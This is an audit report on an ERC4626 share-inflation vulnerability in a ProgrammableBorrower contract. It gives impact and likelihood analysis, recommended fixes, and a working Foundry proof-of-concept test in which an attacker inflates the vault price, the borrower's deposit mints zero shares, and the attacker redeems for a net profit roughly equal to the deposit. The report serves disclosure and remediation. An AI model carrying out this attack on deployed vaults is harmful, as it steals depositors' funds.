### Title
ERC4626 share inflation steals programmable-borrower deposits and leaves phantom LP NAV - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower._depositToVault` accepts any share amount returned by the configured ERC4626 vault without requiring nonzero shares or checking the shares’ post-deposit asset value. An attacker who controls the vault’s initial shares can inflate the share price with a direct asset transfer, causing the borrower’s epoch-start deposit to mint zero shares while donating the entire deposit to the attacker-controlled shares. `onStartEpoch` snapshots the cash balance as epoch principal before depositing it, so the position is later recorded as a vault loss, but the CDO’s strategy-token-backed NAV remains unchanged.

### Finding Description
During `onStartEpoch`, the borrower calculates `startAssets` using its raw underlying balance plus current vault assets, deposits all raw underlying, and stores `startAssets` as `epochStartVaultAssets`. [1](#0-0) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but only emits the returned `shares`; it does not require `shares > 0`, compare returned shares to `convertToShares(_assetAmount)`, or verify that `convertToAssets(shares)` approximately equals `_assetAmount`. [2](#0-1) 

If the vault has one attacker-owned share and `D + 1` donated underlying, a borrower deposit of `D` receives `floor(D / (D + 2)) == 0` shares. The borrower no longer owns vault assets, while `epochStartVaultAssets` still includes `D`, so `_vaultNetInterest` records the full amount as a loss. [3](#0-2) 

`totalInterestDueNow` can only report net positive interest and clamps a pure loss to zero. [4](#0-3)  Meanwhile, the credit vault values CDO holdings from strategy-token balance, and the credit-vault strategy token price is fixed at one underlying unit. [5](#0-4) [6](#0-5)  Because the stolen ERC4626 deposit does not burn CDO strategy tokens, the CDO continues displaying principal-backed tranche NAV even though the corresponding underlying was transferred to the attacker’s vault shares.

### Impact Explanation
This is direct theft followed by temporary freezing and eventual insolvency/default.

For a programmable-borrower deposit of `D`:

1. Attacker owns the only vault share after depositing `1` underlying.
2. Attacker donates `D + 1` underlying to the vault.
3. `ProgrammableBorrower` deposits `D` and receives zero shares.
4. The vault holds approximately `2D + 2`, all owned by the attacker’s one share.
5. The attacker redeems for `2D + 2`, having spent `D + 2`, for net profit of approximately `D`.
6. The CDO retains `D` strategy tokens and corresponding tranche NAV, but the underlying backing was removed.
7. When that phantom NAV becomes a withdrawal request, the programmable borrower has no corresponding assets and repayment ultimately fails or the loss must be manually crystallized onto LPs.

The exploitable amount is the full balance deposited through `_depositToVault`, subject to the attacker’s ability to control enough vault shares and fund the inflation donation.

### Likelihood Explanation
Likelihood is conditional but realistic for a newly deployed or low-float ERC4626 vault configured for the programmable borrower. The strongest path requires the attacker to be the vault’s first depositor or to control substantially all outstanding shares before `onStartEpoch` deposits CDO funds. For established vaults with diversified shareholders, the required donation grows with total vault supply and the attacker receives only their share of the stolen deposit, reducing profitability.

The attacker needs only unprivileged ERC4626 interactions—deposit, direct asset transfer, and redeem. No CDO owner, manager, guardian, borrower, Keyring administrator, fee receiver, or queue misbehavior is required. The missing share check is entirely in `ProgrammableBorrower._depositToVault`. [2](#0-1) 

### Recommendation
Validate every ERC4626 deposit economically rather than trusting the returned share count:

- Revert when `vault.deposit` returns zero shares for a nonzero deposit.
- Require `vault.convertToAssets(returnedShares)` to be at least `_assetAmount` minus a bounded rounding tolerance.
- Alternatively require `returnedShares >= expectedShares - tolerance`, using a pre-deposit conversion and enforcing a strict minimum-share bound.
- Consider requiring a protected initial vault deposit/dead shares before connecting the vault to `ProgrammableBorrower`.
- Treat a nonzero `vaultLoss` at `onStartEpoch` or `onStopEpoch` as an explicit accounting failure rather than merely allowing it to reduce `totalInterestDueNow` to zero.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Detailed} from
  "../contracts/interfaces/IERC20Detailed.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract PoCToken is ERC20 {
  constructor() ERC20("PoC USD", "pUSD") {}
  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract InflatableERC4626 is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(IERC20Detailed asset_) ERC20("Vault Share", "vSHARE") {
    assetToken = asset_;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 assetsBefore = totalAssets();
    uint256 supply = totalSupply();

    // Same vulnerable conversion shape used by ordinary ERC4626 vaults.
    shares = supply == 0 || assetsBefore == 0
      ? assets
      : assets * supply / assetsBefore;

    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract PoCCDO {
  address public token;
  constructor(address token_) {
    token = token_;
  }
}

contract ProgrammableBorrowerShareInflationPoC is Test {
  PoCToken internal underlying;
  InflatableERC4626 internal vault;
  ProgrammableBorrower internal borrower;
  PoCCDO internal cdo;

  address internal attacker = makeAddr("attacker");
  address internal owner = makeAddr("owner");
  address internal manager = makeAddr("manager");
  address internal realBorrower = makeAddr("realBorrower");

  uint256 internal constant DEPOSIT = 1_000_000e6;

  function setUp() public {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

    underlying = new PoCToken();
    vault = new InflatableERC4626(IERC20Detailed(address(underlying)));
    cdo = new PoCCDO(address(underlying));

    borrower = new ProgrammableBorrower();
    borrower.initialize(
      address(vault),
      address(cdo),
      owner,
      manager,
      realBorrower,
      0
    );
  }

  function testShareInflationStealsEpochStartDeposit() public {
    // Attacker becomes the sole vault shareholder.
    underlying.mint(attacker, DEPOSIT + 2);
    vm.startPrank(attacker);
    underlying.approve(address(vault), type(uint256).max);
    uint256 attackerShares = vault.deposit(1, attacker);
    assertEq(attackerShares, 1);

    // Inflate the vault so the borrower's deposit mints zero shares.
    underlying.transfer(address(vault), DEPOSIT + 1);
    vm.stopPrank();

    // Simulate IdleCDOEpochVariant sending principal to the borrower
    // and then invoking onStartEpoch.
    underlying.mint(address(borrower), DEPOSIT);
    vm.prank(address(cdo));
    borrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrower)), 0);
    assertEq(borrower.vaultLoss(), DEPOSIT);
    assertEq(borrower.totalInterestDueNow(), 0);

    // The attacker redeems the sole share for both the donation and
    // the borrower's deposit.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 recovered = vault.redeem(attackerShares, attacker, attacker);

    assertEq(recovered, 2 * DEPOSIT + 2);
    assertEq(
      underlying.balanceOf(attacker) - attackerBefore,
      2 * DEPOSIT + 2
    );

    // Net attacker profit is approximately DEPOSIT:
    // spent = 1 deposit + DEPOSIT + 1 donation = DEPOSIT + 2
    // recovered = 2 * DEPOSIT + 2.
  }
}
